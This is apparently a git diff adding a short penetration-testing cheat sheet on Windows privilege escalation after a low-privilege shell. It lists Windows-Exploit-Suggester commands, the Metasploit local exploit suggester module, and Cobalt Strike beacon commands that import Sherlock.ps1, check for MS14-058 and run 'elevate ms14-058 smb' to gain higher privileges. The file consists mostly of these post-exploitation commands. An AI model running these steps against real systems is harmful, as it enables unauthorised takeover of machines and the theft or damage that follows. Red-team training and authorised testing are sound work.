@@ -1,1 +1,29 @@
 
+Powersploit
+Powerup
+
+---------------------------Windows-Exploit-Suggester---------------------------
+
+# update the database and copy the db file name in the output
+python windows-exploit-suggester.py --update
+
+# copy the systeminfo output from the low priilege shell in a file in your own server
+
+# Check for possible exploits with the script
+python windows-exploit-suggester.py --database <db file name> --systeminfo <file with systeminfo output>
+
+---------------------------Metasploit Local Exploit Suggester Module---------------------------
+
+post/multi/recon/local_exploit_suggester
+
+
+---------------------------Sherlock---------------------------
+
+# send the sherlock.ps1 file to low privileged shell
+
+beacon> getuid
+beacon> powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1
+beacon> powershell Find-MS14058
+beacon> elevate ms14-058 smb
+beacon> getuid
+
